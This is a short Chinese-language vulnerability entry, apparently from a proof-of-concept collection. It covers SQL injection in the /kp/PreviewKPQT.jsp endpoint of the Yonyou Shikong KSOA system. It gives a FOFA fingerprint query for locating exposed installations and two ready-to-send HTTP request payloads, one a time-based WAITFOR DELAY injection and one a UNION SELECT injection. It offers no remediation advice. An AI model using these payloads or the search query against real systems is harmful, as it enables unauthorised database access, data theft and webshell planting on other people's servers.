# 用友时空KSOA系统接口PreviewKPQT.jsp存在SQL注入漏洞

用友时空KSOA接口 `/kp/PreviewKPQT.jsp` 接口存在SQL注入漏洞，黑客可以利用该漏洞执行任意SQL语句，如查询数据、下载数据、写入webshell、执行系统命令以及绕过登录限制等。

## fofa

```yaml
app="用友-时空KSOA"
```

## poc

```yaml
GET /kp/PreviewKPQT.jsp?KPQTID=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27-- HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36
Connection: close
```

```java
GET /kp/PreviewKPQT.jsp?KPQType=KPQT&KPQTID=1%27+union+select+sys.fn_varbintohexstr(hashbytes(%27md5%27,%27test%27)),2,3+--+ HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36
Connection: close
```

